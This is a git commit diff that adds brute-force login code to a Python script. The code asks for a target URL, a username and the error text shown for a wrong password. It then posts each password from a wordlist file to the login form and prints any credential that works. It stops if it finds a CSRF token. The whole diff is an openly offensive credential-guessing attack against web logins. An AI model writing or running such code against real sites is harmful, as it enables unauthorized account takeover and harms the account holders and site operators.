40e5f9c245cfcb7433a248b23d6adbbc3aaf94f8
unofficialdxnny <82535503+unofficialdxnny@users.noreply.github.com>
2022-01-09 20:42:21 +0000

    Update main.py

--- main.py
+++ main.py
@@ -86,3 +86,31 @@ print("\n")
 
 ## print the final time
 print(d2)
+
+
+
+### Final code that does the bruteforcing
+url = input("Enter Target Url: ")
+username = input("Enter Target Username: ")
+error = input("Enter Wrong Password Error Message: ")
+try:
+    def bruteCracking(username,url,error):
+        for password in passwords:
+            password = password.strip()
+            print("Trying:" + password)
+            data_dict = {"username": username,"password": password,                           "login":"submit"}
+            response = requests.post(url, data=data_dict)
+            if error in str(response.content):
+               pass
+            elif "csrf" in str(response.content):
+                 print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+                 exit()
+            else:
+                 print("Username: ---> " + username)
+                 print("Password: ---> " + password)
+                 exit()
+except:
+       print("Some Error Occurred Please Check Your Internet Connection !!")
+with open("passwords.txt", "r") as passwords:
+     bruteCracking(username,url,error)
+print("[!!] password not found in password list")
